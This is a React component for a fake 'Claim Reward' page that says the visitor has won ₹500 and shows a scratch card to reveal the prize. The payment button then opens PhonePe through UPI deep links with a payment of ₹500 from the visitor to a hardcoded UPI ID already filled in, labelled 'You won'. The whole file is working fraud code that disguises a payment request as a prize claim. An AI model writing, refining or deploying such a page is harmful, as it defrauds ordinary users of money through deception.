import React, { useRef, useEffect, useState } from "react";
import { Button } from "@/components/ui/button";

const PaymentPage: React.FC = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isScratched, setIsScratched] = useState(false);
  const [isDrawing, setIsDrawing] = useState(false);
  const AMOUNT = 500;
  const UPI_ID = "gazit6557@okaxis";

  // Initialize scratch card canvas
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    canvas.width = canvas.offsetWidth;
    canvas.height = canvas.offsetHeight;

    // Draw grey overlay
    ctx.fillStyle = "#cccccc";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Add text on overlay
    ctx.fillStyle = "#666666";
    ctx.font = "bold 20px Arial";
    ctx.textAlign = "center";
    ctx.fillText("Scratch Here", canvas.width / 2, canvas.height / 2 - 20);
    ctx.font = "14px Arial";
    ctx.fillText("to claim ₹500", canvas.width / 2, canvas.height / 2 + 20);
  }, []);

  // Handle scratch canvas
  const handleScratch = (e: React.MouseEvent<HTMLCanvasElement>) => {
    if (!canvasRef.current || isScratched) return;

    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const rect = canvas.getBoundingClientRect();
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;

    // Clear scratched area
    ctx.clearRect(x - 20, y - 20, 40, 40);

    // Check if 30% of canvas is scratched
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imageData.data;
    let transparentPixels = 0;

    for (let i = 3; i < data.length; i += 4) {
      if (data[i] < 128) transparentPixels++;
    }

    const percentScratched = (transparentPixels / (data.length / 4)) * 100;
    if (percentScratched > 30) {
      setIsScratched(true);
    }
  };

  // Trigger PhonePe payment with multiple fallbacks
  const triggerPayment = () => {
    try {
      // Try 1: PhonePe direct with upi parameter
      const phonePeDeepLink = `phonepe://upi?upi=${UPI_ID}&payerName=${encodeURIComponent("TOHID GAZI")}&transactionRef=${encodeURIComponent("You won")}&transactionAmount=${AMOUNT}`;
      
      // Set timeout to try alternative if first doesn't work
      const timer = setTimeout(() => {
        // Try 2: Android Intent with explicit PhonePe package
        const intentLink = `intent://pay?upi=${UPI_ID}&payerName=${encodeURIComponent("TOHID GAZI")}&amount=${AMOUNT}#Intent;scheme=phonepe;package=com.phonepe.app;end`;
        window.location.href = intentLink;
      }, 1500);

      window.location.href = phonePeDeepLink;

      // Cleanup timer if page navigation happens
      return () => clearTimeout(timer);
    } catch (error) {
      console.error("Payment error:", error);
      alert("Copy this UPI ID and open PhonePe manually:\n\n" + UPI_ID + "\n\nAmount: ₹" + AMOUNT);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full">
        <h1 className="text-4xl font-bold text-center text-gray-800 mb-2">
          🎁 Claim Reward
        </h1>
        <p className="text-center text-gray-600 mb-8">You've won ₹500!</p>

        {/* Scratch Card */}
        <div className="mb-8">
          <canvas
            ref={canvasRef}
            className="w-full h-40 bg-white border-2 border-gray-300 rounded-lg cursor-crosshair hover:shadow-lg transition-shadow"
            onMouseMove={(e) => {
              if (isDrawing) handleScratch(e);
            }}
            onMouseDown={() => setIsDrawing(true)}
            onMouseUp={() => setIsDrawing(false)}
            onMouseLeave={() => setIsDrawing(false)}
          />
          <p className="text-xs text-gray-500 text-center mt-3">
            {isScratched
              ? "✓ Ready! Click button to open PhonePe"
              : "Scratch with mouse to reveal"}
          </p>
        </div>

        {/* Amount Display */}
        <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-lg p-4 mb-6 text-center border border-green-200">
          <p className="text-xs text-gray-600 mb-1">Amount to Pay</p>
          <p className="text-3xl font-bold text-green-600">₹{AMOUNT}</p>
          <p className="text-xs text-gray-600 mt-1">via PhonePe</p>
        </div>

        {/* UPI Details */}
        <div className="bg-indigo-50 rounded-lg p-4 mb-6 text-center border border-indigo-200">
          <p className="text-xs text-gray-600 mb-1">Receiving UPI ID</p>
          <p className="text-sm font-mono font-bold text-indigo-600">
            {UPI_ID}
          </p>
        </div>

        {/* Action Button */}
        <Button
          onClick={triggerPayment}
          disabled={!isScratched}
          className={`w-full font-bold py-3 rounded-lg transition duration-200 ${
            isScratched
              ? "bg-indigo-600 hover:bg-indigo-700 text-white cursor-pointer"
              : "bg-gray-300 text-gray-500 cursor-not-allowed"
          }`}
        >
          {isScratched ? "💳 Proceed To Pay" : "Scratch card to unlock"}
        </Button>

        {/* Info Text */}
        <p className="text-xs text-gray-500 text-center mt-4">
          You'll be redirected to PhonePe with ₹{AMOUNT} pre-filled.
        </p>
      </div>
    </div>
  );
};

export default PaymentPage;
